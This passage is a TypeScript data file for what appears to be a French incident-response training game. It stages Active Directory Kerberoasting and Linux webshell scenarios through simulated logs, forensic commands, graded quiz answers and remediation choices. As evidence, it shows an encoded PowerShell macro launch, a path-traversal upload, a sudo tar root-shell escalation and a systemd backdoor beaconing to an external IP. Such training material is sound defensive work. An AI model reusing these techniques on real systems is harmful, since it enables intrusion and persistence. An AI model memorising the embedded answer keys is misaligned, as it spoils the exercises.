export type MissionSeverity = 'P1 — Critique' | 'P2 — Élevée';

export type LogSeverity = 'CRITIQUE' | 'ALERTE' | 'INFO';

export type AssetStatus = 'Compromis' | 'Suspect' | 'Ciblé' | 'Nominal';

export interface MissionAsset {
  id: string;
  name: string;
  role: string;
  ip: string;
  os: string;
  status: AssetStatus;
}

export interface MissionLogEntry {
  id: string;
  timestamp: string;
  source: string;
  host: string;
  severity: LogSeverity;
  eventCode: string;
  actor: string;
  srcIp: string;
  dstIp: string;
  summary: string;
  rawPayload: string;
  isEvidence: boolean;
  killChainPhase?: string;
  analystNote: string;
}

export interface ForensicCommand {
  id: string;
  tool: string;
  command: string;
  description: string;
  output: string;
}

export interface InvestigationQuestion {
  id: string;
  prompt: string;
  hint: string;
  options: string[];
  correctIndex: number;
  explanation: string;
  evidenceLogId: string;
}

export interface RemediationAction {
  id: string;
  label: string;
  category: 'Confinement' | 'Éradication' | 'Récupération';
  isRecommended: boolean;
  rationale: string;
}

export interface ProMission {
  id: string;
  ticketId: string;
  title: string;
  domain: string;
  organization: string;
  sector: string;
  environment: string;
  severity: MissionSeverity;
  slaMinutes: number;
  estimatedMinutes: number;
  xpReward: number;
  relatedCourseIds: number[];
  mitreTechniques: { id: string; name: string }[];
  summary: string;
  initialAlert: string;
  businessImpact: string;
  assets: MissionAsset[];
  logs: MissionLogEntry[];
  forensicCommands: ForensicCommand[];
  questions: InvestigationQuestion[];
  remediationActions: RemediationAction[];
  postMortem: {
    rootCause: string;
    dwellTime: string;
    keyIocs: string[];
    hardeningLessons: string[];
  };
}

export const PRO_MISSIONS: ProMission[] = [
  {
    id: 'inc-ad-kerberoast',
    ticketId: 'INC-2026-041',
    title: 'Intrusion Active Directory, Kerberoasting & Tentative DCSync',
    domain: 'Active Directory',
    organization: 'Groupe Industriel Valmont',
    sector: 'Industrie & Aéronautique',
    environment: 'On-Premise AD DS · CORP.VALMONT.LOCAL',
    severity: 'P1 — Critique',
    slaMinutes: 30,
    estimatedMinutes: 12,
    xpReward: 150,
    relatedCourseIds: [15, 31, 12],
    mitreTechniques: [
      { id: 'T1558.003', name: 'Kerberoasting (RC4 0x17)' },
      { id: 'T1021.006', name: 'Mouvement latéral WinRM' },
      { id: 'T1003.006', name: 'DCSync (Réplication AD)' },
    ],
    summary:
      'Le SIEM remonte une rafale de demandes de tickets de service Kerberos chiffrés en RC4 depuis un poste comptable à 03h14 UTC, suivie d’une connexion WinRM vers le serveur SQL et d’une tentative de réplication d’annuaire sur DC01.',
    initialAlert:
      'Alerte SIEM #88412 : Event ID 4769 (TicketEncryptionType=0x17) inhabituel émis par WKST-COMPTA-14 vers svc_sql_backup, corrélé avec Event ID 4662 (DS-Replication-Get-Changes-All) sur DC01.',
    businessImpact:
      'Risque imminent de compromission complète du domaine CORP.VALMONT.LOCAL (hash KRBTGT) et d’arrêt de la chaîne ERP de production.',
    assets: [
      {
        id: 'a1',
        name: 'WKST-COMPTA-14',
        role: 'Poste comptabilité (Patient Zéro)',
        ip: '10.20.4.44',
        os: 'Windows 11 Enterprise',
        status: 'Compromis',
      },
      {
        id: 'a2',
        name: 'SRV-SQL-ERP01',
        role: 'Serveur base de données ERP',
        ip: '10.20.10.21',
        os: 'Windows Server 2022',
        status: 'Suspect',
      },
      {
        id: 'a3',
        name: 'DC01.CORP.VALMONT',
        role: 'Contrôleur de domaine principal',
        ip: '10.20.1.10',
        os: 'Windows Server 2022 Core',
        status: 'Ciblé',
      },
      {
        id: 'a4',
        name: 'SRV-PRINT-02',
        role: 'Serveur d’impression interne',
        ip: '10.20.10.55',
        os: 'Windows Server 2019',
        status: 'Nominal',
      },
    ],
    logs: [
      {
        id: 'ad-l1',
        timestamp: '2026-11-25 03:08:11',
        source: 'Windows Security',
        host: 'DC01',
        severity: 'INFO',
        eventCode: '4624',
        actor: 'CORP\\backup-veeam$',
        srcIp: '10.20.10.90',
        dstIp: '10.20.1.10',
        summary: 'Ouverture de session réseau planifiée (Type 3) pour la sauvegarde nocturne Veeam.',
        rawPayload:
          '{"EventID":4624,"LogonType":3,"TargetUserName":"backup-veeam$","IpAddress":"10.20.10.90","AuthenticationPackageName":"Kerberos","Status":"0x0"}',
        isEvidence: false,
        analystNote: 'Trafic de sauvegarde planifié légitime, conforme à la fenêtre 03h00-04h00.',
      },
      {
        id: 'ad-l2',
        timestamp: '2026-11-25 03:11:04',
        source: 'Sysmon',
        host: 'WKST-COMPTA-14',
        severity: 'CRITIQUE',
        eventCode: 'Event 1',
        actor: 'CORP\\n.dubois',
        srcIp: '10.20.4.44',
        dstIp: '10.20.4.44',
        summary: 'Exécution PowerShell encodée lancée depuis WINWORD.EXE (Facture_Q4_Urgent.docm).',
        rawPayload:
          '{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","CommandLine":"powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...","User":"CORP\\\\n.dubois"}',
        isEvidence: true,
        killChainPhase: '1 · Accès initial & Exécution',
        analystNote: 'Preuve clé : macro Word malveillante déclenchant un script PowerShell masqué.',
      },
      {
        id: 'ad-l3',
        timestamp: '2026-11-25 03:12:48',
        source: 'Proxy DNS',
        host: 'DNS-FWD-01',
        severity: 'INFO',
        eventCode: 'DNS-A',
        actor: 'WKST-COMPTA-14',
        srcIp: '10.20.4.44',
        dstIp: '10.20.1.10',
        summary: 'Résolution DNS normale pour windowsupdate.microsoft.com.',
        rawPayload:
          '{"QueryName":"windowsupdate.microsoft.com","QueryType":"A","ClientIP":"10.20.4.44","ResponseCode":"NOERROR"}',
        isEvidence: false,
        analystNote: 'Résolution système Microsoft Windows Update standard.',
      },
      {
        id: 'ad-l4',
        timestamp: '2026-11-25 03:14:22',
        source: 'Windows Security',
        host: 'DC01',
        severity: 'CRITIQUE',
        eventCode: '4769',
        actor: 'CORP\\n.dubois',
        srcIp: '10.20.4.44',
        dstIp: '10.20.1.10',
        summary: 'Demande TGS Kerberos avec chiffrement faible RC4 (0x17) pour le compte de service svc_sql_backup.',
        rawPayload:
          '{"EventID":4769,"TargetUserName":"n.dubois@CORP.VALMONT.LOCAL","ServiceName":"svc_sql_backup","TicketOptions":"0x40810000","TicketEncryptionType":"0x17","IpAddress":"::ffff:10.20.4.44","Status":"0x0"}',
        isEvidence: true,
        killChainPhase: '2 · Accès aux identifiants (Kerberoasting)',
        analystNote: 'Preuve clé : demande de ticket TGS en RC4 (0x17) sur un SPN privilégié, typique de Rubeus/Invoke-Kerberoast.',
      },
      {
        id: 'ad-l5',
        timestamp: '2026-11-25 03:16:15',
        source: 'Windows Security',
        host: 'DC01',
        severity: 'INFO',
        eventCode: '4769',
        actor: 'CORP\\m.laurent',
        srcIp: '10.20.5.12',
        dstIp: '10.20.1.10',
        summary: 'Demande TGS Kerberos AES256 (0x12) pour SRV-PRINT-02$.',
        rawPayload:
          '{"EventID":4769,"TargetUserName":"m.laurent@CORP.VALMONT.LOCAL","ServiceName":"SRV-PRINT-02$","TicketEncryptionType":"0x12","IpAddress":"::ffff:10.20.5.12","Status":"0x0"}',
        isEvidence: false,
        analystNote: 'Ticket légitime chiffré en AES256 (0x12) vers un compte machine standard.',
      },
      {
        id: 'ad-l6',
        timestamp: '2026-11-25 03:19:07',
        source: 'Sysmon',
        host: 'WKST-COMPTA-14',
        severity: 'ALERTE',
        eventCode: 'Event 3',
        actor: 'CORP\\n.dubois',
        srcIp: '10.20.4.44',
        dstIp: '91.199.212.52',
        summary: 'Connexion HTTPS sortante (TCP/443) vers une IP externe non catégorisée par powershell.exe.',
        rawPayload:
          '{"EventID":3,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","SourceIp":"10.20.4.44","DestinationIp":"91.199.212.52","DestinationPort":443,"Protocol":"tcp"}',
        isEvidence: true,
        killChainPhase: '3 · Commande & Contrôle (C2)',
        analystNote: 'Preuve clé : exfiltration du ticket TGS vers l’infrastructure attaquant 91.199.212.52 pour cassage hors ligne.',
      },
      {
        id: 'ad-l7',
        timestamp: '2026-11-25 03:22:30',
        source: 'Firewall',
        host: 'FW-CORE-01',
        severity: 'INFO',
        eventCode: 'ALLOW',
        actor: 'SRV-SQL-ERP01',
        srcIp: '10.20.10.21',
        dstIp: '10.20.10.90',
        summary: 'Flux TCP/1433 autorisé entre SRV-SQL-ERP01 et le serveur de sauvegarde Veeam.',
        rawPayload:
          '{"Action":"ALLOW","Rule":"R-SQL-BACKUP","SrcIP":"10.20.10.21","DstIP":"10.20.10.90","DstPort":1433,"Bytes":4829102}',
        isEvidence: false,
        analystNote: 'Flux de sauvegarde SQL attendu vers l’appliance Veeam.',
      },
      {
        id: 'ad-l8',
        timestamp: '2026-11-25 03:26:41',
        source: 'Windows Security',
        host: 'SRV-SQL-ERP01',
        severity: 'CRITIQUE',
        eventCode: '4624',
        actor: 'CORP\\svc_sql_backup',
        srcIp: '10.20.4.44',
        dstIp: '10.20.10.21',
        summary: 'Connexion réseau réussie (WinRM TCP/5985) avec le compte svc_sql_backup depuis le poste comptable.',
        rawPayload:
          '{"EventID":4624,"LogonType":3,"TargetUserName":"svc_sql_backup","WorkstationName":"WKST-COMPTA-14","IpAddress":"10.20.4.44","ProcessName":"wsmprovhost.exe","Port":5985}',
        isEvidence: true,
        killChainPhase: '4 · Mouvement latéral (WinRM)',
        analystNote: 'Preuve clé : le mot de passe faible de svc_sql_backup a été cassé et réutilisé depuis WKST-COMPTA-14.',
      },
      {
        id: 'ad-l9',
        timestamp: '2026-11-25 03:28:02',
        source: 'Windows Security',
        host: 'DC01',
        severity: 'INFO',
        eventCode: '4625',
        actor: 'CORP\\j.martin',
        srcIp: '10.20.8.19',
        dstIp: '10.20.1.10',
        summary: '1 échec d’authentification unique (mot de passe expiré) depuis le poste atelier.',
        rawPayload:
          '{"EventID":4625,"TargetUserName":"j.martin","IpAddress":"10.20.8.19","SubStatus":"0xC0000071","FailureReason":"Password expired"}',
        isEvidence: false,
        analystNote: 'Incident utilisateur banal (mot de passe expiré, 1 seule tentative).',
      },
      {
        id: 'ad-l10',
        timestamp: '2026-11-25 03:30:19',
        source: 'Windows Security',
        host: 'DC01',
        severity: 'CRITIQUE',
        eventCode: '4662',
        actor: 'CORP\\svc_sql_backup',
        srcIp: '10.20.10.21',
        dstIp: '10.20.1.10',
        summary: 'Accès objet AD suspect : DS-Replication-Get-Changes-All (GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) depuis SRV-SQL-ERP01.',
        rawPayload:
          '{"EventID":4662,"SubjectUserName":"svc_sql_backup","ObjectType":"domainDNS","Properties":"{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}","AccessMask":"0x100","ClientIP":"10.20.10.21"}',
        isEvidence: true,
        killChainPhase: '5 · Élévation / DCSync sur DC01',
        analystNote: 'Preuve clé : svc_sql_backup disposait par erreur de droits de réplication AD et tente un dump DCSync.',
      },
      {
        id: 'ad-l11',
        timestamp: '2026-11-25 03:31:05',
        source: 'Firewall',
        host: 'FW-CORE-01',
        severity: 'INFO',
        eventCode: 'ALLOW',
        actor: 'DC01',
        srcIp: '10.20.1.10',
        dstIp: '10.20.1.11',
        summary: 'Réplication Active Directory légitime entre DC01 et DC02.',
        rawPayload:
          '{"Action":"ALLOW","Rule":"R-AD-REPL","SrcIP":"10.20.1.10","DstIP":"10.20.1.11","DstPort":389,"Service":"LDAP/RPC"}',
        isEvidence: false,
        analystNote: 'Réplication normale entre contrôleurs de domaine dédiés.',
      },
      {
        id: 'ad-l12',
        timestamp: '2026-11-25 03:33:40',
        source: 'Proxy DNS',
        host: 'DNS-FWD-01',
        severity: 'INFO',
        eventCode: 'DNS-A',
        actor: 'SRV-PRINT-02',
        srcIp: '10.20.10.55',
        dstIp: '10.20.1.10',
        summary: 'Requête NTP interne vers ntp.corp.valmont.local.',
        rawPayload:
          '{"QueryName":"ntp.corp.valmont.local","QueryType":"A","ClientIP":"10.20.10.55","ResponseCode":"NOERROR"}',
        isEvidence: false,
        analystNote: 'Synchronisation horaire interne nominale.',
      },
    ],
    forensicCommands: [
      {
        id: 'ad-cmd-1',
        tool: 'PowerShell AD',
        command: 'Get-ADUser svc_sql_backup -Properties ServicePrincipalName,MemberOf,PasswordLastSet',
        description: 'Inspecter les SPN, l’ancienneté du mot de passe et les groupes du compte de service.',
        output: `SamAccountName       : svc_sql_backup
Enabled              : True
PasswordLastSet      : 14/03/2021 09:12:04  [ALERTE : 5 ans sans rotation]
ServicePrincipalName : {MSSQLSvc/SRV-SQL-ERP01.corp.valmont.local:1433}
MemberOf             : {CN=Domain Admins,CN=Users,DC=corp,DC=valmont,DC=local}
KerberosEncryption   : RC4_HMAC_MD5 autorisé (msDS-SupportedEncryptionTypes = 0)`,
      },
      {
        id: 'ad-cmd-2',
        tool: 'Threat Intel',
        command: 'ti-lookup --ip 91.199.212.52',
        description: 'Vérifier la réputation de l’adresse IP contactée par WKST-COMPTA-14.',
        output: `IP             : 91.199.212.52 (ASN 49981 · Hébergeur VPS hors UE)
Réputation     : MALVEILLANT (Score AbuseIPDB 96/100)
Activité vue   : Relais C2 Sliver / Cobalt Strike signalé sur 4 campagnes Kerberoasting
Dernière vue   : 2026-11-25 03:19:07 UTC depuis WKST-COMPTA-14`,
      },
      {
        id: 'ad-cmd-3',
        tool: 'AD ACL Audit',
        command: 'Get-ObjectAcl -DistinguishedName "DC=corp,DC=valmont,DC=local" | ? {$_.IdentityReference -match "svc_sql"}',
        description: 'Contrôler les droits étendus sur la racine du domaine.',
        output: `IdentityReference : CORP\\Domain Admins (hérité par svc_sql_backup)
ActiveDirectoryRights : ExtendedRight
ObjectType        : 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
Verdict           : EXCÈS DE PRIVILÈGES CRITIQUE — un compte de service SQL ne doit jamais être Domain Admin.`,
      },
      {
        id: 'ad-cmd-4',
        tool: 'EDR Live',
        command: 'edr-tree --host WKST-COMPTA-14 --since 03:10',
        description: 'Afficher l’arbre de processus complet sur le poste comptable.',
        output: `PID 4120  explorer.exe
 └─ PID 6388  WINWORD.EXE ("Facture_Q4_Urgent.docm")
     └─ PID 7044  powershell.exe -NoP -W Hidden -Enc ...
         ├─ [Réseau] TCP 443 -> 91.199.212.52 (C2)
         └─ [Module] Invoke-Rubeus (Kerberoast RC4 -> svc_sql_backup)`,
      },
    ],
    questions: [
      {
        id: 'ad-q1',
        prompt: 'Quel est le vecteur d’accès initial sur le poste Patient Zéro (WKST-COMPTA-14) ?',
        hint: 'Regardez le processus parent dans l’événement Sysmon Event 1 à 03:11.',
        options: [
          'Une vulnérabilité RDP brute-force depuis Internet',
          'Une macro Word (WINWORD.EXE) lançant PowerShell encodé',
          'Un agent Veeam corrompu pendant la sauvegarde nocturne',
          'Une faille du serveur d’impression SRV-PRINT-02',
        ],
        correctIndex: 1,
        explanation:
          'Sysmon Event 1 (03:11:04) montre WINWORD.EXE ouvrant Facture_Q4_Urgent.docm et lançant powershell.exe -NoP -W Hidden -Enc.',
        evidenceLogId: 'ad-l2',
      },
      {
        id: 'ad-q2',
        prompt: 'Quel indicateur dans l’événement 4769 prouve une attaque Kerberoasting ?',
        hint: 'Observez le champ TicketEncryptionType et le compte visé.',
        options: [
          'TicketEncryptionType = 0x12 (AES256) sur SRV-PRINT-02$',
          'SubStatus = 0xC0000071 sur j.martin',
          'TicketEncryptionType = 0x17 (RC4) demandé pour le SPN svc_sql_backup',
          'LogonType = 3 par backup-veeam$',
        ],
        correctIndex: 2,
        explanation:
          'Un chiffrement RC4 (0x17) demandé par un utilisateur standard pour un compte de service avec SPN (svc_sql_backup) est la signature classique du Kerberoasting.',
        evidenceLogId: 'ad-l4',
      },
      {
        id: 'ad-q3',
        prompt: 'Quelle action critique l’attaquant tente-t-il sur DC01 à 03:30:19 (Event ID 4662) ?',
        hint: 'Vérifiez le GUID {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}.',
        options: [
          'Une attaque DCSync pour extraire les condensats NTLM/KRBTGT de l’annuaire',
          'La création d’une imprimante réseau partagée',
          'Une synchronisation NTP standard avec DC02',
          'Une mise à jour automatique Windows Update',
        ],
        correctIndex: 0,
        explanation:
          'Le droit étendu DS-Replication-Get-Changes-All invoqué par un compte non-contrôleur (svc_sql_backup) caractérise une tentative DCSync.',
        evidenceLogId: 'ad-l10',
      },
      {
        id: 'ad-q4',
        prompt: 'Pourquoi le compte svc_sql_backup a-t-il pu exécuter cette réplication sur DC01 ?',
        hint: 'Lancez la commande PowerShell Get-ADUser dans la console d’investigation.',
        options: [
          'Parce que le pare-feu FW-CORE-01 bloquait TCP/1433',
          'Parce qu’il était membre de Domain Admins avec un mot de passe inchangé depuis 2021',
          'Parce que le compte j.martin avait un mot de passe expiré',
          'Parce que DNS-FWD-01 utilisait UDP/53',
        ],
        correctIndex: 1,
        explanation:
          'Get-ADUser révèle que svc_sql_backup est membre de Domain Admins, autorise RC4 et n’a pas subi de rotation de mot de passe depuis 2021.',
        evidenceLogId: 'ad-l10',
      },
    ],
    remediationActions: [
      {
        id: 'ad-r1',
        label: 'Isoler réseau WKST-COMPTA-14 et SRV-SQL-ERP01 via l’EDR sans les éteindre',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Coupe le C2 et le mouvement latéral tout en préservant la RAM pour l’analyse forensique.',
      },
      {
        id: 'ad-r2',
        label: 'Bloquer l’IP C2 91.199.212.52 sur le pare-feu périmétrique et le proxy',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Interrompt immédiatement toute exfiltration ou commande sortante vers le relais attaquant.',
      },
      {
        id: 'ad-r3',
        label: 'Retirer svc_sql_backup de Domain Admins, migrer vers un compte gMSA et réinitialiser n.dubois',
        category: 'Éradication',
        isRecommended: true,
        rationale: 'Supprime l’excès de privilèges et rend les tickets RC4 inutilisables grâce aux mots de passe gMSA gérés automatiquement.',
      },
      {
        id: 'ad-r4',
        label: 'Effectuer une double réinitialisation du compte KRBTGT (à 10h+ d’intervalle) après audit DCSync',
        category: 'Récupération',
        isRecommended: true,
        rationale: 'Invalide tout Golden Ticket potentiel généré si le hash KRBTGT a été lu.',
      },
      {
        id: 'ad-r5',
        label: 'Redémarrer immédiatement DC01 et vider les journaux Security pour relancer la production',
        category: 'Confinement',
        isRecommended: false,
        rationale: 'Erreur grave : détruit les preuves volatiles et les journaux d’audit sans révoquer les tickets compromis.',
      },
      {
        id: 'ad-r6',
        label: 'Désactiver totalement Kerberos et forcer NTLMv1 sur tout le domaine',
        category: 'Éradication',
        isRecommended: false,
        rationale: 'Contre-productif : NTLMv1 est obsolète et encore plus vulnérable au relais et au cassage.',
      },
    ],
    postMortem: {
      rootCause:
        'Macro Office malveillante sur WKST-COMPTA-14 exploitant ensuite un compte de service SPN (svc_sql_backup) sur-privilégié (Domain Admins) avec chiffrement RC4 activé.',
      dwellTime: '19 minutes entre l’exécution initiale (03:11) et la tentative DCSync (03:30).',
      keyIocs: [
        'IP C2 : 91.199.212.52:443',
        'Fichier vecteur : Facture_Q4_Urgent.docm',
        'Comptes compromis : CORP\\n.dubois, CORP\\svc_sql_backup',
        'Event IDs critiques : Sysmon 1, 4769 (0x17), 4624 (WinRM), 4662 (DCSync)',
      ],
      hardeningLessons: [
        'Convertir tous les comptes de service avec SPN en gMSA (Group Managed Service Accounts) et interdire RC4.',
        'Appliquer le modèle de Tiering AD : aucun compte applicatif dans Domain Admins.',
        'Bloquer les macros VBA provenant d’Internet par GPO (Attack Surface Reduction).',
      ],
    },
  },
  {
    id: 'inc-linux-systemd',
    ticketId: 'INC-2026-042',
    title: 'Compromission Serveur Linux, Webshell Nginx & Persistance Systemd',
    domain: 'Linux & Serveur',
    organization: 'FinTech NordPay',
    sector: 'Services Financiers',
    environment: 'Ubuntu 24.04 LTS · srv-pay-prod-02 (DMZ)',
    severity: 'P1 — Critique',
    slaMinutes: 30,
    estimatedMinutes: 12,
    xpReward: 150,
    relatedCourseIds: [19, 29, 24],
    mitreTechniques: [
      { id: 'T1190', name: 'Exploitation d’une application exposée' },
      { id: 'T1543.002', name: 'Persistance via service Systemd' },
      { id: 'T1098.004', name: 'Injection de clé SSH authorized_keys' },
    ],
    summary:
      'La sonde Prometheus signale une charge CPU anormale à 92% sur srv-pay-prod-02 et le pare-feu UFW enregistre des tentatives sortantes récurrentes toutes les 180 secondes vers une IP externe.',
    initialAlert:
      'Alerte Linux EDR #44019 : Service systemd non référencé (sys-telemetry-sync.service) exécuté en root depuis /var/tmp/.cache-sync.',
    businessImpact:
      'Risque d’extraction des variables d’environnement de paiement (.env) et de rebond vers la base PostgreSQL interne.',
    assets: [
      {
        id: 'l-a1',
        name: 'srv-pay-prod-02',
        role: 'Passerelle API Paiement (Nginx + Node)',
        ip: '172.16.20.14',
        os: 'Ubuntu 24.04 LTS',
        status: 'Compromis',
      },
      {
        id: 'l-a2',
        name: 'db-pay-pg01',
        role: 'Base PostgreSQL Transactions',
        ip: '10.40.8.12',
        os: 'Debian 12',
        status: 'Ciblé',
      },
      {
        id: 'l-a3',
        name: 'bastion-ops-01',
        role: 'Bastion SSH d’administration',
        ip: '10.40.1.5',
        os: 'Ubuntu 24.04 LTS',
        status: 'Nominal',
      },
    ],
    logs: [
      {
        id: 'lnx-l1',
        timestamp: '2026-11-25 01:40:12',
        source: 'auth.log',
        host: 'srv-pay-prod-02',
        severity: 'INFO',
        eventCode: 'SSH-OK',
        actor: 'ops-deploy',
        srcIp: '10.40.1.5',
        dstIp: '172.16.20.14',
        summary: 'Connexion SSH légitime par clé publique depuis bastion-ops-01.',
        rawPayload:
          'Nov 25 01:40:12 srv-pay-prod-02 sshd[18204]: Accepted publickey for ops-deploy from 10.40.1.5 port 51204 ssh2: ED25519 SHA256:k8vQ...bastion',
        isEvidence: false,
        analystNote: 'Déploiement normal via le bastion SSH autorisé.',
      },
      {
        id: 'lnx-l2',
        timestamp: '2026-11-25 01:47:33',
        source: 'Nginx access.log',
        host: 'srv-pay-prod-02',
        severity: 'CRITIQUE',
        eventCode: 'HTTP 200',
        actor: 'www-data',
        srcIp: '185.220.101.47',
        dstIp: '172.16.20.14',
        summary: 'Requête POST exploitant /api/v1/upload avec traversal ../../public/healthz.php (HTTP 200).',
        rawPayload:
          '185.220.101.47 - - [25/Nov/2026:01:47:33 +0000] "POST /api/v1/upload?path=../../public/healthz.php HTTP/1.1" 200 1842 "-" "curl/8.5.0"',
        isEvidence: true,
        killChainPhase: '1 · Exploitation Web & Dépôt Webshell',
        analystNote: 'Preuve clé : dépôt d’un fichier exécutable via Path Traversal depuis 185.220.101.47.',
      },
      {
        id: 'lnx-l3',
        timestamp: '2026-11-25 01:48:05',
        source: 'Nginx access.log',
        host: 'srv-pay-prod-02',
        severity: 'INFO',
        eventCode: 'HTTP 200',
        actor: 'healthcheck',
        srcIp: '10.40.1.20',
        dstIp: '172.16.20.14',
        summary: 'Sonde interne GET /status effectuée par le load balancer HAProxy.',
        rawPayload:
          '10.40.1.20 - - [25/Nov/2026:01:48:05 +0000] "GET /status HTTP/1.1" 200 42 "-" "HAProxy-HealthCheck"',
        isEvidence: false,
        analystNote: 'Contrôle de disponibilité standard du répartiteur de charge.',
      },
      {
        id: 'lnx-l4',
        timestamp: '2026-11-25 01:51:19',
        source: 'auditd',
        host: 'srv-pay-prod-02',
        severity: 'CRITIQUE',
        eventCode: 'EXECVE',
        actor: 'www-data -> root',
        srcIp: '172.16.20.14',
        dstIp: '172.16.20.14',
        summary: 'Élévation via sudo mal configuré : www-data exécute /usr/bin/tar --checkpoint-action=exec=/bin/sh en root.',
        rawPayload:
          'type=EXECVE msg=audit(1764035479.112:889): argc=5 a0="sudo" a1="/usr/bin/tar" a2="-cf" a3="/dev/null" a4="--checkpoint-action=exec=/bin/sh" uid=33 euid=0',
        isEvidence: true,
        killChainPhase: '2 · Élévation de privilèges (GTFOBins sudo tar)',
        analystNote: 'Preuve clé : règle sudoers trop permissive permettant à www-data de passer root via tar.',
      },
      {
        id: 'lnx-l5',
        timestamp: '2026-11-25 01:54:02',
        source: 'journalctl (systemd)',
        host: 'srv-pay-prod-02',
        severity: 'CRITIQUE',
        eventCode: 'UNIT-START',
        actor: 'root',
        srcIp: '172.16.20.14',
        dstIp: '172.16.20.14',
        summary: 'Création et activation d’une unité systemd suspecte : /etc/systemd/system/sys-telemetry-sync.service.',
        rawPayload:
          'Nov 25 01:54:02 srv-pay-prod-02 systemd[1]: Reloading... Started sys-telemetry-sync.service (ExecStart=/var/tmp/.cache-sync --beacon 45.142.212.19:8443).',
        isEvidence: true,
        killChainPhase: '3 · Persistance Systemd',
        analystNote: 'Preuve clé : binaire caché dans /var/tmp/.cache-sync lancé automatiquement par systemd en root.',
      },
      {
        id: 'lnx-l6',
        timestamp: '2026-11-25 01:55:44',
        source: 'auditd',
        host: 'srv-pay-prod-02',
        severity: 'ALERTE',
        eventCode: 'FILE-WRITE',
        actor: 'root',
        srcIp: '172.16.20.14',
        dstIp: '172.16.20.14',
        summary: 'Ajout d’une clé SSH inconnue dans /root/.ssh/authorized_keys (commentaire backup@ext-node).',
        rawPayload:
          'type=PATH msg=audit(1764035744.402:912): name="/root/.ssh/authorized_keys" nametype=NORMAL uid=0 comm="sh" key="ssh_keys_watch"',
        isEvidence: true,
        killChainPhase: '4 · Persistance secondaire (Clé SSH root)',
        analystNote: 'Preuve clé : porte dérobée SSH ajoutée pour revenir même si le webshell est supprimé.',
      },
      {
        id: 'lnx-l7',
        timestamp: '2026-11-25 01:57:10',
        source: 'journalctl (systemd)',
        host: 'srv-pay-prod-02',
        severity: 'INFO',
        eventCode: 'CRON',
        actor: 'root',
        srcIp: '172.16.20.14',
        dstIp: '172.16.20.14',
        summary: 'Exécution normale de logrotate.service.',
        rawPayload:
          'Nov 25 01:57:10 srv-pay-prod-02 systemd[1]: Finished Rotate log files (logrotate.service).',
        isEvidence: false,
        analystNote: 'Tâche système quotidienne standard.',
      },
      {
        id: 'lnx-l8',
        timestamp: '2026-11-25 01:58:29',
        source: 'ufw.log',
        host: 'srv-pay-prod-02',
        severity: 'CRITIQUE',
        eventCode: 'UFW-ALLOW',
        actor: '.cache-sync',
        srcIp: '172.16.20.14',
        dstIp: '45.142.212.19',
        summary: 'Trafic sortant TCP/8443 récurrent vers 45.142.212.19 (beaconing chiffré toutes les 180s).',
        rawPayload:
          'Nov 25 01:58:29 srv-pay-prod-02 kernel: [UFW AUDIT] OUT=eth0 SRC=172.16.20.14 DST=45.142.212.19 PROTO=TCP DPT=8443 LEN=1420',
        isEvidence: true,
        killChainPhase: '5 · Commande & Contrôle sortant (TCP/8443)',
        analystNote: 'Preuve clé : le serveur DMZ communique vers l’extérieur sur TCP/8443 faute de filtrage Egress strict.',
      },
      {
        id: 'lnx-l9',
        timestamp: '2026-11-25 02:00:01',
        source: 'auth.log',
        host: 'srv-pay-prod-02',
        severity: 'INFO',
        eventCode: 'PAM-SESSION',
        actor: 'prometheus',
        srcIp: '10.40.1.30',
        dstIp: '172.16.20.14',
        summary: 'Collecte métriques node_exporter depuis le serveur de supervision.',
        rawPayload:
          'Nov 25 02:00:01 srv-pay-prod-02 node_exporter[944]: scrape OK from 10.40.1.30 (duration=14ms)',
        isEvidence: false,
        analystNote: 'Supervision interne Prometheus normale.',
      },
      {
        id: 'lnx-l10',
        timestamp: '2026-11-25 02:02:15',
        source: 'ufw.log',
        host: 'srv-pay-prod-02',
        severity: 'INFO',
        eventCode: 'UFW-BLOCK',
        actor: 'Internet',
        srcIp: '198.51.100.77',
        dstIp: '172.16.20.14',
        summary: 'Scan de port SSH (TCP/22) bloqué par UFW depuis Internet.',
        rawPayload:
          'Nov 25 02:02:15 srv-pay-prod-02 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.77 DST=172.16.20.14 PROTO=TCP DPT=22',
        isEvidence: false,
        analystNote: 'Bruit de scan Internet classique déjà bloqué par la règle UFW.',
      },
    ],
    forensicCommands: [
      {
        id: 'lnx-cmd-1',
        tool: 'Linux Systemd',
        command: 'systemctl cat sys-telemetry-sync.service',
        description: 'Lire le fichier unit suspect créé dans /etc/systemd/system.',
        output: `[Unit]
Description=System Telemetry Sync Helper
After=network-online.target

[Service]
Type=simple
User=root
ExecStart=/var/tmp/.cache-sync --beacon 45.142.212.19:8443
Restart=always
RestartSec=15

[Install]
WantedBy=multi-user.target`,
      },
      {
        id: 'lnx-cmd-2',
        tool: 'Linux Sudoers',
        command: 'sudo -l -U www-data',
        description: 'Vérifier les privilèges sudo attribués au compte applicatif web.',
        output: `User www-data may run the following commands on srv-pay-prod-02:
    (root) NOPASSWD: /usr/bin/tar
[DIAGNOSTIC] Faille GTFOBins : tar accepte --checkpoint-action=exec=/bin/sh pour lancer un shell root.`,
      },
      {
        id: 'lnx-cmd-3',
        tool: 'Forensics Hash',
        command: 'sha256sum /var/tmp/.cache-sync && ls -la /root/.ssh/authorized_keys',
        description: 'Calculer l’empreinte du binaire suspect et vérifier la modification des clés SSH root.',
        output: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /var/tmp/.cache-sync
[VirusTotal] 41/72 moteurs détectent Linux.Backdoor.SliverImplant
-rw------- 1 root root 914 Nov 25 01:55 /root/.ssh/authorized_keys (dernière ligne : ssh-ed25519 AAAA... backup@ext-node)`,
      },
      {
        id: 'lnx-cmd-4',
        tool: 'Réseau Linux',
        command: 'ss -tupn | grep 8443',
        description: 'Lister les sockets actifs sortants sur le port 8443.',
